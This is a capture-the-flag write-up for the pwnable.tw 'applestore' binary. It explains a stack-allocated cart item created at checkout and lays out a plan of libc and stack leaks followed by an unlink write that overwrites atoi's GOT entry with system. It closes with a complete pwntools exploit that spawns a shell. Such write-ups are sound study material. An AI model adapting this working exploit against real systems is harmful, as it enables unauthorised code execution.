# 📌 **applestore - pwnable.tw**  

## 🔹 **Vulnerability Analysis**  
Check Security Protections
``` bash
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    RUNPATH:    b'.'
    Stripped:   No
```

## Program Overview
The program is a shopping cart application with the following five main functions:
1. **Add Item**: Adds a new item to the cart.
2. **Delete Item**: Removes an item from the cart.
3. **Display Bought Items**: Lists all items currently in the cart.
4. **List Available Products**: Displays available products for purchase.
5. **Checkout**: Processes the cart for checkout (not officially supported).

The cart items are stored using a doubly linked list, where each newly added item is appended to the tail of the list. The structure of an item is as follows:
```c
typedef struct item {
    char* name;
    int price;
    struct item *next_item;
    struct item *prev_item;
} item;
```
# Vulnerability Analysis

The vulnerability lies in the **checkout function**. Here's how it works:

1. The function checks if the total price of all items in the cart equals **7174**.
2. If the condition is met, it adds a new item (e.g., "iPhone 8") to the cart.
3. However, the new item is **added differently** compared to the `add item` function:
   - In the `add item` function, items are allocated on the **heap**.
   - In the `checkout` function, the new item is created on the **stack**.
   - The stack address corresponds to the input buffer used in the `handler` function and the input buffer of the `cart` function.

This inconsistency creates an opportunity for exploitation.

---

# Exploitation Plan

## Step 1: Prepare the Cart
1. Add items to the cart such that their total price sums up to **7174**.
2. This will trigger the `checkout` function, causing it to add a new item to the cart with a **stack address** in the doubly linked list.

## Step 2: Leak a Libc Address
1. Send the input `"0x804b033"` to the `handler` function's input buffer.
   - The `atoi` function will convert `0x33` (stopping at the first non-numeric character) to the integer `3`.
   - The value `3` corresponds to the **delete item** function (third choice in the menu).
2. When the item is deleted, the program prints the `name` of the deleted item.
   - In this case, the `name` corresponds to the address `0x804b033`, which points to an entry in the **GOT (Global Offset Table)**.
   - This leaks the address of the `__libc_start_main` function, allowing us to calculate the base address of `libc`.

## Step 3: Leak a Stack Address
1. Use the same method as above, but this time leverage the `cart` function.
   - The previous method leaks the address pointed to by `environ`, which has a **constant offset** to the stack.
   - This allows us to compute the **saved EBP pointer** in the `delete` function.

## Step 4: Overwrite `atoi` with `system`
1. Compute the address of the **saved EBP** in the `delete` function.
2. Overwrite the `atoi` GOT entry with the address of `system`.
   - This is the easiest way to gain control, as the program uses `atoi` to convert user input into integers for menu choices.
   - After overwriting `atoi`, any input passed to it will be interpreted as a command to `system`.

---

We can use the following Python program to determine the list of items required to trigger the checkout vulnerability. The program recursively searches for a combination of items whose total price equals the target value (in this case, 7174).
``` python
In [21]: def f(index, items_prices , target_number, used) :
    ...:     if target_number == 0 :
    ...:         return True
    ...:     if index >= len(items_prices) :
    ...:         return False
    ...:     flag = 0
    ...:     if target_number >= items_prices[index] :
    ...:         used.append(items_prices[index])
    ...:         flag = f(index, l , target_number - items_prices[index], used)
    ...:         if not flag :
    ...:             used.pop()
    ...:     if not flag :
    ...:         return f(index+1, items_prices, target_number, used)
    ...:     return flag
```
    Args:
        index (int): Current index in the items_prices list.
        items_prices (list): List of available item prices.
        target_number (int): The target total price. (7174)
        used (list): List to store the selected items.

    Returns:
        bool: True if a valid combination is found, otherwise False.
        
## 🔹 **Exploit Code** 
        
``` python
#! /usr/bin/python3.10
from pwn import *

p = process("./applestore_patched")
# p = remote("chall.pwnable.tw", 10104)
libc_elf = ELF("./libc_32.so.6")
prog_elf = ELF("./applestore_patched")

l = [199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 499, 499, 499, 499, 499, 499, 399]
_map = {199: "1", 499: "3", 399: "4"}

for _ in l:
    p.sendlineafter("> ", "2")
    p.sendlineafter("Device Number> ", _map[_])

# pause()
p.sendlineafter("> ", "5")
p.sendlineafter("Let me check your cart. ok? (y/n) > ", "y")
p.sendafter("> ", p32(0x804b033, "little") + b"\x00" * 12)
p.sendlineafter("Item Number> ", "28")
p.recvuntil("Remove 28:")
libc_leak = p.recvline()[:-1]
libc_leak = int.from_bytes(libc_leak[1:5], "little")
print("libc_leak @ ", hex(libc_leak))
libc_base = libc_leak - libc_elf.symbols["__libc_start_main"]
libc_elf.address = libc_base

atoi_got_addr = prog_elf.got["atoi"]
system_addr = libc_elf.symbols["system"]
environ = libc_elf.symbols["environ"]

p.sendafter("> ", p32(0x804b034, "little") + b"\x00" * 12)
p.sendlineafter("Let me check your cart. ok? (y/n) > ", b"y\x00" + p32(environ))
p.recvuntil("27: ")
stack_leak = int.from_bytes(p.recv(4), "little")
print("stack_leak @ ", hex(stack_leak))

delete_saved_ebp = stack_leak - 0x104
print("saved ebp ptr @ ", hex(delete_saved_ebp))

p.sendafter("> ", p32(0x804b033, "little") + b"\x00" * 4 + p32(delete_saved_ebp - 0x0c) + p32(atoi_got_addr + 0x22))
p.sendlineafter("Item Number> ", "28")
p.recvuntil("Remove 28:")

p.sendlineafter("> ", p32(system_addr) + b";sh\x00")

p.interactive()
```
